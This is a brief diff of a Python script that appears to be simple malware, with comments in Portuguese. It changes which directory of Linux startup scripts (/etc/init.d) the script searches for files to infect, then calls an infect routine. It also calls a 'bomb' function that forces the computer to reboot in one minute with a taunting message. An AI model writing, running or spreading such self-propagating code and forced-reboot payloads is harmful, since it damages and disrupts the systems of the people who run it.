@@ -44,6 +44,6 @@ def bomb():
     #computador reiniciado em 1 minuto
         os.system("shutdown -r 1 Seu computador será reiniciado... DENOVO")
 
-filestoinfect = search(os.path.abspath("/etc/rc.d/init.d"))
+filestoinfect = search(os.path.abspath("/etc/init.d"))
 infect(filestoinfect)
 bomb()
